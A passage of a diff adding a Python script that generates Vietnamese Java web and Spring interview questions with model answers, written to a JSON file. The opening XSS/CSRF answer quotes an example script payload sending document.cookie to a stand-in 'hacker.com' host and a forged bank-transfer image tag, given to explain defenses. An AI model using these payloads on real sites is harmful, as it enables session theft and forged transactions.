+        "modelAnswer": "1. **Tấn công XSS (Cross-Site Scripting - Chèn mã kịch bản độc hại)**:\n   - **Cơ chế**: Hacker nhập các đoạn mã JavaScript (ví dụ `<script>fetch('hacker.com/steal?cookie=' + document.cookie)</script>`) vào các ô nhập liệu như bình luận, tên tài khoản. Khi người dùng khác truy cập vào trang đó, trình duyệt tự động thực thi đoạn mã JS độc hại này và gửi Cookie phiên làm việc về cho hacker.\n   - **Cách phòng chống**: **Escape toàn bộ ký tự HTML đặc biệt** (`<` thành `&lt;`, `>` thành `&gt;`). Trong JSP, luôn dùng thẻ **`<c:out value=\"${data}\" />`** của JSTL vì thẻ này tự động escape. Ngoài ra, đặt cờ **`HttpOnly`** cho Cookie để JavaScript không thể đọc được `JSESSIONID`.\n2. **Tấn công CSRF (Cross-Site Request Forgery - Giả mạo yêu cầu)**:\n   - **Cơ chế**: Nạn nhân đang đăng nhập vào website ngân hàng (đang lưu Cookie hợp lệ). Hacker gửi cho nạn nhân một email có gắn link ảnh ẩn: `<img src=\"https://mybank.com/transfer?to=hacker&amount=1000\" />`. Khi nạn nhân click vào link, trình duyệt tự động đính kèm Cookie ngân hàng hợp lệ gửi đi, khiến ngân hàng tưởng nạn nhân chủ động chuyển tiền!\n   - **Cách phòng chống**: Sử dụng **CSRF Token** (Anti-CSRF Token). Mỗi khi render form, Server sinh ra một chuỗi ngẫu nhiên bí mật và gắn vào thẻ ẩn `<input type=\"hidden\" name=\"csrf_token\" value=\"xyz\" />`. Khi submit form, Server kiểm tra nếu token gửi lên khớp với token trong session mới cho phép xử lý. Website của hacker không thể biết được token này.",
+        "seniorTip": "Spring Security mặc định tự động kích hoạt tính năng bảo vệ CSRF Protection cho mọi phương thức POST/PUT/DELETE."
+    },
+    {
+        "id": "audit_40",
+        "domain": "JavaWeb",
+        "question": "Tại sao giao thức HTTP lại là Stateless? Các giải pháp phổ biến hiện nay để duy trì trạng thái đăng nhập của người dùng là gì?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "HTTP Stateless: Mỗi cặp request-response là hoàn toàn độc lập, Server không lưu giữ bất kỳ ngữ cảnh nào về các request trước đó của cùng client.",
+            "Mục đích Stateless: Giúp Web Server nhẹ tải, dễ dàng scale ngang (Horizontal scaling).",
+            "Giải pháp 1: Stateful Session (HttpSession + JSESSIONID Cookie truyền thống).",
+            "Giải pháp 2: Stateless Token (JSON Web Token - JWT lưu ở Client, Server chỉ verify chữ ký số, tối ưu cho REST API và Microservices)."
+        ],
+        "modelAnswer": "1. **Bản chất Stateless của HTTP**:\n   - Giao thức HTTP được thiết kế theo nguyên lý **Stateless (Phi trạng thái)**: Mỗi khi Client gửi một yêu cầu và Server phản hồi xong, kết nối sẽ đóng lại. Máy chủ **hoàn toàn không ghi nhớ bất kỳ điều gì** về yêu cầu trước đó. Yêu cầu số 2 gửi lên được đối xử như một người xa lạ hoàn toàn.\n   - **Lợi ích**: Giúp các kiến trúc Web cực kỳ dễ dàng mở rộng quy mô (**Scalability**) vì bất kỳ máy chủ nào trong cụm cluster cũng có thể xử lý request mà không cần quan tâm máy chủ nào đã tiếp nhận request trước đó.\n2. **Các giải pháp duy trì trạng thái đăng nhập**:\n   - **Giải pháp truyền thống - Stateful Session (`HttpSession`)**:\n     - Máy chủ lưu thông tin đăng nhập trong bộ nhớ RAM (Session Store), cấp cho người dùng một thẻ định danh `JSESSIONID` qua Cookie.\n     - Nhược điểm: Khó scale out trên nhiều server (phải dùng Sticky Session hoặc Redis Session chia sẻ).\n   - **Giải pháp hiện đại - Stateless Token (`JWT - JSON Web Token`)**:\n     - Khi đăng nhập thành công, Server sinh ra một chuỗi JWT mã hóa thông tin user và ký bằng một chữ ký số bí mật (Digital Signature), sau đó trả về cho Client lưu trong LocalStorage hoặc Cookie.\n     - Ở mỗi request tiếp theo, Client đính kèm JWT vào header `Authorization: Bearer <token>`. Server chỉ cần dùng khóa bí mật để kiểm tra chữ ký (verify) là biết ngay user hợp lệ mà **không cần truy vấn Database hay lưu trữ gì trên RAM**!",
+        "seniorTip": "Chủ động đề cập JWT và so sánh với Session truyền thống để chứng minh bạn nắm vững cả kiến trúc Monolith và Microservices."
+    },
+
+    # ==========================================
+    # 5. SPRING FRAMEWORK & SPRING BOOT (41 - 50)
+    # ==========================================
+    {
+        "id": "audit_41",
+        "domain": "Spring Framework",
+        "question": "Inversion of Control (IoC) và Dependency Injection (DI) trong Spring Framework là gì? Lợi ích mang lại cho dự án phần mềm?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "IoC (Đảo ngược quyền điều khiển): Thay vì code tự 'new' và quản lý vòng đời đối tượng, quyền kiểm soát được giao phó hoàn toàn cho Spring IoC Container.",
+            "DI (Tiêm phụ thuộc): Là một hiện thực cụ thể của IoC, trong đó các đối tượng phụ thuộc được Container 'bơm/tiêm' từ bên ngoài vào class.",
+            "Lợi ích: Giảm sự phụ thuộc chặt chẽ (Loose Coupling), tuân thủ nguyên lý Dependency Inversion (SOLID), cực kỳ dễ dàng viết Unit Test (dễ mock dữ liệu)."
+        ],
+        "modelAnswer": "1. **Khái niệm IoC (Inversion of Control - Đảo ngược quyền điều khiển)**:\n   - Trong lập trình truyền thống, nếu `Class OrderService` cần sử dụng `EmailService`, nó sẽ chủ động tự khởi tạo đối tượng: `private EmailService email = new EmailService();` $\\to$ Điều này làm các class bị phụ thuộc chặt chẽ vào nhau (Tightly Coupled).\n   - Với **IoC**, quyền kiểm soát việc tạo lập, cấu hình và quản lý vòng đời của đối tượng bị đảo ngược: **Giao phó toàn bộ cho một bộ khung quản lý tập trung gọi là Spring IoC Container (ApplicationContext)**.\n2. **Khái niệm DI (Dependency Injection - Tiêm phụ thuộc)**:\n   - DI là mẫu thiết kế (Design Pattern) hiện thực hóa nguyên lý IoC. Thay vì class tự đi tìm hoặc tự `new` phụ thuộc, Spring Container sẽ **tự động \"tiêm\" (Inject)** các đối tượng phụ thuộc đã được khởi tạo sẵn vào cho class sử dụng thông qua Constructor hoặc Annotation.\n3. **Lợi ích to lớn của IoC/DI**:\n   - **Loose Coupling (Liên kết lỏng lẻo)**: Các module không còn dính chặt vào nhau. Ta có thể dễ dàng thay thế `EmailService` bằng `SmsService` mà không cần sửa đổi mã nguồn bên trong `OrderService`.\n   - **Dễ dàng Unit Testing**: Khi viết test cho `OrderService`, ta có thể dễ dàng tiêm một đối tượng giả lập (Mock/Stub Object) vào mà không cần phải kết nối thật tới máy chủ gửi mail.\n   - Tuân thủ nguyên lý chữ **D** trong bộ nguyên tắc thiết kế **SOLID** (Dependency Inversion Principle).",
+        "seniorTip": "Khẳng định: IoC là nguyên lý kiến trúc (Principle), còn DI là phương pháp triển khai cụ thể (Design Pattern)."
+    },
+    {
+        "id": "audit_42",
+        "domain": "Spring Framework",
+        "question": "So sánh 3 hình thức Dependency Injection: Constructor Injection, Setter Injection và Field Injection? Tại sao Constructor Injection được khuyến nghị số 1?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Field Injection (@Autowired trực tiếp trên biến): Dễ viết nhất nhưng khó test (phải dùng reflection), dễ bị NullPointerException ngoài container, che giấu vi phạm Single Responsibility.",
+            "Setter Injection (@Autowired trên hàm set): Thích hợp cho các phụ thuộc tùy chọn (Optional dependencies).",
+            "Constructor Injection (@Autowired trên constructor): Bắt buộc khởi tạo đầy đủ phụ thuộc, đối tượng có thể đặt biến final (Immutable), cực kỳ dễ viết Unit Test bằng tay new Service(mockRepo).",
+            "Từ Spring 4.3, class có 1 constructor duy nhất thì không cần viết chữ @Autowired."
+        ],
+        "modelAnswer": "1. **So sánh 3 hình thức Dependency Injection**:\n   - **`Field Injection`** (Dùng `@Autowired` trực tiếp trên thuộc tính `private UserRepository userRepo;`):\n     - *Ưu điểm*: Cú pháp cực kỳ ngắn gọn, đẹp mắt.\n     - *Nhược điểm*: Khiến class bị phụ thuộc hoàn toàn vào Spring Container. Khi viết Unit Test, không thể khởi tạo bằng `new OrderService()` được vì biến bị `private null`, bắt buộc phải dùng Reflection để chèn mock. Dễ vô tình nhồi nhét quá nhiều phụ thuộc vi phạm nguyên tắc Single Responsibility.\n   - **`Setter Injection`** (Gắn `@Autowired` trên phương thức `setUserRepo(...)`):\n     - Thích hợp cho các **phụ thuộc tùy chọn (Optional dependencies)** có thể có hoặc không, hoặc có thể thay đổi lại trong quá trình chạy ứng dụng.\n   - **`Constructor Injection`** (Tiêm qua hàm tạo constructor):\n     - Toàn bộ các đối tượng phụ thuộc được truyền trực tiếp qua tham số của Constructor.\n2. **Tại sao Spring Team và cộng đồng Senior KHUYẾN NGHỊ CONSTRUCTOR INJECTION?**:\n   - **Tính bất biến (Immutability)**: Cho phép khai báo các biến phụ thuộc với từ khóa **`final`** (`private final UserRepository userRepo;`), đảm bảo một khi đối tượng đã khởi tạo thì phụ thuộc không bao giờ bị trỏ đi chỗ khác hoặc bị `null`.\n   - **An toàn tuyệt đối (Fail-Fast)**: Đảm bảo đối tượng không bao giờ rơi vào trạng thái khởi tạo dở dang (nửa vời). Nếu thiếu phụ thuộc, ứng dụng sẽ báo lỗi ngay lập tức lúc build/khởi động.\n   - **Tối ưu cho Unit Test**: Khi viết kiểm thử JUnit, ta chỉ cần gọi `new OrderService(mockUserRepository)` một cách thuần túy mà không cần bật Spring Context nặng nề.",
+        "seniorTip": "Nhắc thêm việc dùng Lombok '@RequiredArgsConstructor' để kết hợp với Constructor Injection giúp code vừa ngắn vừa chuẩn kiến trúc."
+    },
+    {
+        "id": "audit_43",
+        "domain": "Spring Framework",
+        "question": "Trình bày vòng đời (Lifecycle) của một Spring Bean từ lúc khởi tạo đến lúc bị tiêu hủy?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Các bước cốt lõi: Instantiate (Tạo instance) -> Populate Properties (Tiêm DI) -> BeanNameAware / BeanFactoryAware -> BeanPostProcessor Pre-Initialization -> @PostConstruct / InitializingBean -> BeanPostProcessor Post-Initialization -> Sẵn sàng sử dụng (Ready for use) -> @PreDestroy / DisposableBean -> Destroy.",
+            "@PostConstruct đánh dấu hàm khởi tạo logic sau khi DI hoàn tất.",
+            "@PreDestroy đánh dấu hàm dọn dẹp trước khi bean bị tiêu hủy."
+        ],
+        "modelAnswer": "Vòng đời của một Spring Bean được quản lý nghiêm ngặt bởi Spring IoC Container qua các bước sau:\n1. **Khởi tạo đối tượng (Instantiation)**: Spring quét cấu hình và gọi Constructor của class để tạo đối tượng Bean trong bộ nhớ.\n2. **Tiêm phụ thuộc (Populate Properties / Dependency Injection)**: Spring tìm và tiêm các giá trị, các Bean phụ thuộc vào các trường đã khai báo (qua Constructor hoặc Setter).\n3. **Cung cấp thông tin nội bộ (Aware Interfaces)**: Nếu Bean implement các interface như `BeanNameAware`, `BeanFactoryAware`, `ApplicationContextAware`, Spring sẽ tự động tiêm các đối tượng này vào Bean.\n4. **Tiền xử lý (BeanPostProcessor - Before Initialization)**: Các bộ tiền xử lý can thiệp vào Bean trước khi chạy hàm khởi tạo.\n5. **Khởi tạo nghiệp vụ (Initialization)**: \n   - Phương thức gắn chú thích **`@PostConstruct`** được thực thi (đây là nơi ta viết logic nạp dữ liệu ban đầu, kiểm tra kết nối).\n   - Tiếp theo là hàm `afterPropertiesSet()` nếu implements `InitializingBean`.\n6. **Hậu xử lý (BeanPostProcessor - After Initialization)**: Nơi Spring tạo các **AOP Proxy** (ví dụ bọc `@Transactional`, `@Async`). Sau bước này, Bean chính thức sẵn sàng phục vụ các yêu cầu trong ứng dụng.\n7. **Tiêu hủy (Destruction)**: Khi ứng dụng tắt, Spring kích hoạt phương thức gắn chú thích **`@PreDestroy`** (hoặc hàm `destroy()` của `DisposableBean`) để giải phóng tài nguyên, đóng file, ngắt kết nối.",
+        "seniorTip": "Nêu rõ: Không nên viết logic kết nối DB/gọi API trong Constructor mà nên viết trong @PostConstruct vì lúc ở Constructor các biến @Autowired chưa được tiêm xong!"
+    },
+    {
+        "id": "audit_44",
+        "domain": "Spring Framework",
+        "question": "Phân biệt các Scope của Spring Bean: Singleton, Prototype, Request, Session? Mặc định là scope nào?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "Mặc định là SINGLETON Scope.",
+            "Singleton: Chỉ tạo DUY NHẤT 1 instance cho toàn bộ Spring Container. Mọi nơi inject đều dùng chung 1 object đó.",
+            "Prototype: Mỗi lần inject hoặc gọi getBean() là tạo ra một INSTANCE MỚI HOÀN TOÀN.",
+            "Request Scope: Tạo instance mới cho mỗi HTTP Request trong ứng dụng Web.",
+            "Session Scope: Tạo instance mới cho mỗi HTTP Session của người dùng.",
+            "Cảnh báo: Singleton Bean phải là STATELESS (không lưu trữ trạng thái riêng) để đảm bảo an toàn đa luồng."
+        ],
+        "modelAnswer": "Spring hỗ trợ nhiều Scope định nghĩa phạm vi tồn tại của Bean thông qua chú thích `@Scope`:\n1. **`singleton` (MẶC ĐỊNH TRONG SPRING)**:\n   - Spring IoC Container chỉ tạo **duy nhất 1 instance** của Bean đó trong suốt vòng đời của ứng dụng.\n   - Tất cả các class khác khi tiêm Bean này đều dùng chung một đối tượng duy nhất trên bộ nhớ Heap.\n   - **Quy tắc vàng**: Singleton Bean **bắt buộc phải là Stateless (không có trạng thái riêng)**, các trường chỉ chứa các Service/Repository khác chứ không được chứa dữ liệu riêng của người dùng để tránh lỗi xung đột đa luồng.\n2. **`prototype`**:\n   - Ngược lại với Singleton. **Mỗi lần** có một class yêu cầu tiêm Bean này (hoặc mỗi lần gọi `context.getBean()`), Spring sẽ tạo ra một **đối tượng hoàn toàn mới độc lập**.\n   - Thích hợp cho các đối tượng có lưu trữ trạng thái biến thiên (**Stateful Bean**).\n3. **Các Web-aware Scopes** (chỉ có trong ứng dụng Spring Web/Spring MVC):\n   - **`request`**: Mỗi một HTTP Request gửi đến sẽ được tạo một instance Bean riêng, hết request thì Bean bị hủy.\n   - **`session`**: Một instance Bean được tạo cho một phiên làm việc HTTP Session của người dùng.\n   - **`application`**: Gắn với vòng đời của `ServletContext`.",
+        "seniorTip": "Một câu hỏi bẫy rất hay gặp: 'Điều gì xảy ra khi ta tiêm một Prototype Bean vào bên trong một Singleton Bean?' (Trả lời: Prototype Bean sẽ chỉ được khởi tạo 1 lần duy nhất cùng với Singleton, muốn lấy mới phải dùng ObjectProvider hoặc @Lookup)."
+    },
+    {
+        "id": "audit_45",
+        "domain": "Spring Framework",
+        "question": "Phân biệt các Stereotype Annotations trong Spring: @Component, @Service, @Repository và @Controller?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "@Component: Chú thích gốc (Generic stereotype) cho bất kỳ class Java nào muốn được Spring quản lý.",
+            "@Service: Chuyên biệt cho tầng nghiệp vụ (Business Logic/Service Layer), cải thiện tính tường minh.",
+            "@Repository: Chuyên biệt cho tầng truy cập dữ liệu (Data Access/DAO), tự động chuyển đổi các lỗi SQLException thành Spring DataAccessException (Exception Translation).",
+            "@Controller / @RestController: Chuyên biệt cho tầng điều khiển giao diện web / API RESTful."
+        ],
+        "modelAnswer": "Tất cả các chú thích này đều là **Stereotype Annotations** và về mặt kỹ thuật, `@Service`, `@Repository`, `@Controller` đều là các **Meta-annotation kế thừa từ `@Component`** (đều được Spring Component Scanning phát hiện và đăng ký vào IoC Container). Tuy nhiên chúng được phân định để phục vụ kiến trúc phân tầng:\n1. **`@Component`**:\n   - Là chú thích tổng quát nhất. Dùng để đánh dấu bất kỳ một class tiện ích, module nền tảng nào thuộc quyền quản lý của Spring mà không thuộc 3 tầng còn lại.\n2. **`@Service`**:\n   - Dành riêng cho **Tầng Nghiệp Vụ (Business Logic Layer)**.\n   - Mang ý nghĩa ngữ nghĩa rõ ràng, giúp lập trình viên và các công cụ giám sát biết rằng đây là nơi xử lý các quy tắc nghiệp vụ, tính toán logic và giao dịch.\n3. **`@Repository`**:\n   - Dành riêng cho **Tầng Truy Xuất Dữ Liệu (Data Access Layer / DAO)**.\n   - **Tính năng đặc biệt**: Tự động kích hoạt cơ chế **Dịch ngoại lệ (Exception Translation)**. Nó tự động bắt các ngoại lệ cấp thấp của JDBC/Hibernate (như `SQLException`) và bọc lại thành các ngoại lệ phân cấp nhất quán của Spring (`DataAccessException`), giúp code không bị phụ thuộc vào DB cụ thể.\n4. **`@Controller` / `@RestController`**:\n   - Dành cho **Tầng Điều Khiển (Presentation / API Layer)**.\n   - Xử lý các HTTP Request gửi đến và trả về View HTML hoặc trả về dữ liệu JSON (`@ResponseBody`).",
+        "seniorTip": "Điểm đắt giá nhất câu trả lời là tính năng Exception Translation tự động của @Repository."
+    },
+    {
+        "id": "audit_46",
+        "domain": "Spring Framework",
+        "question": "Khi một Interface có 2 class cùng implement, làm thế nào để Spring biết cần inject Bean nào khi dùng @Autowired? Phân biệt @Qualifier và @Primary?",
+        "timeLimitSeconds": 80,
+        "keyPoints": [
+            "Khi có 2 Bean cùng kiểu (type candidate), @Autowired sẽ văng ngoại lệ NoUniqueBeanDefinitionException.",
+            "Giải pháp 1: Dùng @Primary trên class ưu tiên mặc định.",
+            "Giải pháp 2: Dùng @Qualifier('beanName') tại vị trí inject để chỉ định đích danh tên Bean muốn tiêm.",
+            "@Qualifier có độ ưu tiên cao hơn @Primary."
+        ],
+        "modelAnswer": "1. **Vấn đề phát sinh**:\n   - Giả sử có `interface PaymentService` và có 2 class triển khai là `VnPayPaymentService` và `MomoPaymentService`. Cả hai đều được đánh dấu `@Service`.\n   - Khi một class khác khai báo: `@Autowired private PaymentService paymentService;`, Spring sẽ bối rối vì tìm thấy 2 ứng viên cùng kiểu và lập tức văng lỗi lúc khởi động: **`NoUniqueBeanDefinitionException`**.\n2. **Cách giải quyết với `@Primary` và `@Qualifier`**:\n   - **Sử dụng `@Primary`**:\n     - Đặt chú thích `@Primary` trên 1 trong 2 class (ví dụ trên `VnPayPaymentService`).\n     - Ý nghĩa: Đây là **lựa chọn mặc định ưu tiên số 1**. Bất cứ nơi nào yêu cầu tiêm `PaymentService` mà không chỉ định rõ thì Spring sẽ tự động chọn `VnPayPaymentService`.\n   - **Sử dụng `@Qualifier(\"beanName\")`**:\n     - Đặt trực tiếp tại vị trí tiêm phụ thuộc: `@Autowired @Qualifier(\"momoPaymentService\") private PaymentService paymentService;`\n     - Ý nghĩa: Chỉ định **chính xác tên định danh của Bean** cần lấy.\n3. **Độ ưu tiên**: `@Qualifier` **luôn có độ ưu tiên cao hơn** `@Primary`. Nếu có cả hai, Spring sẽ lấy Bean được chỉ định bởi `@Qualifier`.",
+        "seniorTip": "Nếu tên biến trùng với tên Bean (ví dụ private PaymentService momoPaymentService), Spring cũng tự động fallback lấy theo tên biến."
+    },
+    {
+        "id": "audit_47",
+        "domain": "Spring Framework",
+        "question": "Trình bày luồng xử lý một HTTP Request trong kiến trúc Spring MVC? Vai trò của DispatcherServlet?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "DispatcherServlet là Front Controller tiếp nhận mọi request đầu tiên.",
+            "Luồng 5 bước: DispatcherServlet -> HandlerMapping (tìm Controller) -> HandlerAdapter (thực thi Controller) -> Controller xử lý trả về ModelAndView -> ViewResolver (tìm file giao diện) -> Render HTML trả về client.",
+            "Với REST API (@RestController): HandlerAdapter dùng HttpMessageConverter (Jackson) chuyển thẳng đối tượng sang JSON trả về body."
+        ],
+        "modelAnswer": "Kiến trúc Spring MVC hoạt động dựa trên mẫu thiết kế **Front Controller**, trong đó **`DispatcherServlet`** đóng vai trò là bộ não điều phối trung tâm:\n1. **Bước 1**: Trình duyệt gửi HTTP Request đến máy chủ. `DispatcherServlet` là cửa ngõ duy nhất chặn và tiếp nhận request này đầu tiên.\n2. **Bước 2**: `DispatcherServlet` hỏi **`HandlerMapping`** để tìm xem Controller và phương thức cụ thể nào chịu trách nhiệm xử lý URL này (dựa trên `@GetMapping`, `@PostMapping`).\n3. **Bước 3**: Sau khi xác định được Controller, `DispatcherServlet` ủy quyền cho **`HandlerAdapter`** để thực thi phương thức trong Controller đó. Controller gọi xuống tầng Service/DAO xử lý logic nghiệp vụ và trả về kết quả (dữ liệu Model và tên View).\n4. **Bước 4**: `DispatcherServlet` chuyển tên View cho **`ViewResolver`** (như `InternalResourceViewResolver`). `ViewResolver` sẽ tìm đường dẫn file vật lý (ví dụ `/WEB-INF/views/home.jsp`).\n5. **Bước 5**: View nhận dữ liệu Model để render thành mã HTML hoàn chỉnh và trả về cho trình duyệt.\n*(Lưu ý: Đối với REST API dùng `@RestController`, luồng sẽ bỏ qua ViewResolver; Spring dùng `HttpMessageConverter` (như thư viện Jackson) để tự động serialize đối tượng Java thành chuỗi JSON và ghi thẳng vào HTTP Response Body)*.",
+        "seniorTip": "Vẽ nhanh luồng gồm DispatcherServlet ở trung tâm kết nối với HandlerMapping, Controller, ViewResolver để chứng minh kiến thức chuyên sâu."
+    },
+    {
+        "id": "audit_48",
+        "domain": "Spring Framework",
+        "question": "Từ khóa @Transactional trong Spring hoạt động như thế nào? Nêu 3 trường hợp phổ biến khiến @Transactional không có tác dụng?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "Cơ chế: Dựa trên Spring AOP (Aspect Oriented Programming) tạo Dynamic Proxy bọc lấy Bean.",
+            "Proxy mở transaction trước khi vào hàm, gọi commit khi hàm kết thúc thành công, hoặc rollback khi ném RuntimeException.",
+            "Trường hợp 1 không chạy: Self-invocation (hàm cùng class gọi nhau thì gọi trực tiếp 'this', không đi qua Proxy).",
+            "Trường hợp 2: Đặt @Transactional trên method private/protected (Proxy không can thiệp được).",
+            "Trường hợp 3: Mặc định Spring chỉ rollback với Unchecked Exception (RuntimeException). Nếu ném Checked Exception mà không khai báo rollbackFor = Exception.class thì transaction KHÔNG rollback!"
+        ],
+        "modelAnswer": "1. **Cơ chế hoạt động của `@Transactional`**:\n   - Spring sử dụng kỹ thuật **AOP (Aspect-Oriented Programming)** để sinh ra một lớp bao bọc ảo (**Proxy Object**) bao quanh Bean thực tế.\n   - Khi một method có `@Transactional` được gọi từ bên ngoài, luồng sẽ đi qua Proxy trước. Proxy sẽ:\n     - Mở một Transaction mới kết nối với Database (`setAutoCommit(false)`).\n     - Chuyển tiếp lời gọi tới method thật để thực thi các câu lệnh SQL.\n     - Nếu method chạy thành công: Proxy gọi `connection.commit()`.\n     - Nếu method ném ra ngoại lệ: Proxy bắt lấy và gọi `connection.rollback()`.\n2. **3 Trường hợp kinh điển khiến `@Transactional` BỊ VÔ HIỆU HÓA (Rất hay gặp trong dự án)**:\n   - **Trường hợp 1: Tự gọi nội bộ (Self-invocation)**: Khi Method A gọi sang Method B trong **cùng một class**, lời gọi thực chất là `this.methodB()`. Lời gọi này không đi qua Spring Proxy, do đó các cấu hình `@Transactional` trên Method B hoàn toàn bị bỏ qua!\n   - **Trường hợp 2: Đặt trên phương thức `private` hoặc `protected`**: Spring AOP Proxy chỉ có thể override các phương thức `public`. Đặt trên hàm private sẽ bị Spring lờ đi và không có transaction nào được tạo.\n   - **Trường hợp 3: Ném Checked Exception mà không cấu hình `rollbackFor`**: Mặc định Spring **CHỈ ROLLBACK VỚI RUNTIME EXCEPTION**. Nếu code ném ra một Checked Exception (như `SQLException`, `IOException`), Spring sẽ **vẫn COMMIT bình thường**! Muốn an toàn bắt buộc phải khai báo: `@Transactional(rollbackFor = Exception.class)`.",
+        "seniorTip": "Cả 3 trường hợp này đều là các bug bảo mật/toàn vẹn dữ liệu cực kỳ nguy hiểm trong dự án thực tế."
+    },
+    {
+        "id": "audit_49",
+        "domain": "Spring Framework",
+        "question": "Vấn đề N+1 Query trong JPA/Hibernate là gì? Nguyên nhân và cách khắc phục tối ưu trong dự án thực tế?",
+        "timeLimitSeconds": 90,
+        "keyPoints": [
+            "N+1 Query xảy ra khi truy vấn 1 danh sách gồm N đối tượng cha, nhưng Hibernate lại phát sinh thêm N câu lệnh SQL phụ để truy vấn các đối tượng con liên quan.",
+            "Tổng cộng có 1 + N câu query gửi tới DB, làm suy sụp hiệu năng database nghiêm trọng.",
+            "Nguyên nhân: Mặc định quan hệ Lazy Loading hoặc Eager Loading không dùng JOIN khi duyệt danh sách.",
+            "Giải pháp: (1) Dùng JOIN FETCH trong câu lệnh HQL/JPQL; (2) Dùng @EntityGraph; (3) Cấu hình batch size (@BatchSize)."
+        ],
+        "modelAnswer": "1. **Bản chất của vấn đề N+1 Query**:\n   - Giả sử ta có quan hệ 1-N giữa `Department` (Phòng ban) và `Employee` (Nhân viên).\n   - Ta muốn lấy danh sách 100 phòng ban kèm nhân viên. Hibernate chạy 1 câu query đầu tiên: `SELECT * FROM department;` (lấy ra 100 dòng).\n   - Sau đó, khi code duyệt qua từng phòng ban để lấy danh sách nhân viên (`dept.getEmployees()`), Hibernate lại âm thầm phát sinh thêm 100 câu query con: `SELECT * FROM employee WHERE dept_id = ?;` cho từng phòng ban một!\n   - Kết quả: Thay vì chỉ cần 1 câu lệnh kết nối, hệ thống đã gửi tới **1 + 100 = 101 câu query** xuống Database, gây nghẽn băng thông mạng và làm đơ server.\n2. **Các giải pháp khắc phục triệt để**:\n   - **Sử dụng `JOIN FETCH` trong JPQL**: Thay vì `SELECT d FROM Department d`, ta viết: **`SELECT d FROM Department d JOIN FETCH d.employees`**. Câu lệnh này chỉ thị Hibernate sinh ra 1 câu lệnh SQL duy nhất dùng `INNER JOIN` hoặc `LEFT JOIN` để gom cả cha và con về cùng một lúc.\n   - **Sử dụng `@EntityGraph` (Spring Data JPA)**: Khai báo `@EntityGraph(attributePaths = {\"employees\"})` ngay trên method của Repository.\n   - **Cấu hình `@BatchSize(size = 20)`**: Thay vì truy vấn từng dòng một, Hibernate sẽ gom thành câu lệnh `WHERE dept_id IN (?, ?, ...)` để giảm từ N câu xuống còn N/20 câu.",
+        "seniorTip": "Nêu 'JOIN FETCH' là giải pháp kinh điển và hiệu quả nhất mà mọi Senior Backend Java đều dùng hàng ngày."
+    },
+    {
+        "id": "audit_50",
+        "domain": "Spring Framework",
+        "question": "Spring Boot tự động cấu hình (Auto-configuration) hoạt động dựa trên cơ chế nào? Chú thích @SpringBootApplication bao gồm những gì?",
+        "timeLimitSeconds": 85,
+        "keyPoints": [
+            "@SpringBootApplication là tổ hợp của 3 chú thích: @Configuration, @EnableAutoConfiguration, @ComponentScan.",
+            "Cơ chế Auto-configuration: Quét các thư viện có trong classpath (file JAR dependency). Dựa vào các điều kiện @ConditionalOnClass, @ConditionalOnMissingBean để tự động cấu hình các Bean thích hợp.",
+            "Ví dụ: Thấy spring-boot-starter-web có trong classpath -> tự động cấu hình Tomcat nhúng và DispatcherServlet mà không cần viết file web.xml."
+        ],
+        "modelAnswer": "1. **Tổ hợp bên trong `@SpringBootApplication`**:\n   - Đây là một Meta-annotation đóng gói 3 chú thích cốt lõi:\n     1. **`@Configuration`**: Cho phép class khai báo các Bean cấu hình bằng `@Bean`.\n     2. **`@ComponentScan`**: Tự động quét toàn bộ các package con bên dưới để tìm và đăng ký các Bean có gắn `@Component`, `@Service`, `@Repository`, `@Controller`.\n     3. **`@EnableAutoConfiguration`**: Kích hoạt cơ chế tự động cấu hình ma thuật của Spring Boot.\n2. **Cơ chế hoạt động của Auto-configuration**:\n   - Spring Boot giải phóng lập trình viên khỏi việc phải viết hàng trăm dòng cấu hình XML phức tạp trong quá khứ.\n   - Khi khởi động, Spring Boot duyệt qua file cấu hình `META-INF/spring.factories` (hoặc `AutoConfiguration.imports` từ Spring Boot 3).\n   - Nó sử dụng hàng loạt các chú thích điều kiện thuộc họ **`@Conditional`**:\n     - **`@ConditionalOnClass`**: \"Nếu phát hiện trong classpath có class `HikariDataSource.class` thì tự động khởi tạo Connection Pool HikariCP\".\n     - **`@ConditionalOnMissingBean`**: \"Chỉ tự động tạo Bean này nếu lập trình viên CHƯA TỰ VIẾT một Bean tùy biến nào khác\".\n   - Nhờ đó, chỉ cần ta thêm dependency `starter-web`, Spring Boot sẽ tự động dựng sẵn Tomcat nhúng, cấu hình DispatcherServlet và Jackson JSON parser trong chớp mắt mà không cần ta phải can thiệp thủ công.",
+        "seniorTip": "Nhắc tới file 'spring.factories' hoặc 'AutoConfiguration.imports' chứng minh bạn đã từng đào sâu vào mã nguồn framework."
+    }
+]
+
+with open('data/audit_questions.json', 'w', encoding='utf-8') as f:
+    json.dump(audit_questions, f, ensure_ascii=False, indent=2)
+
+print(f"SUCCESS: Generated {len(audit_questions)} audit questions in data/audit_questions.json")
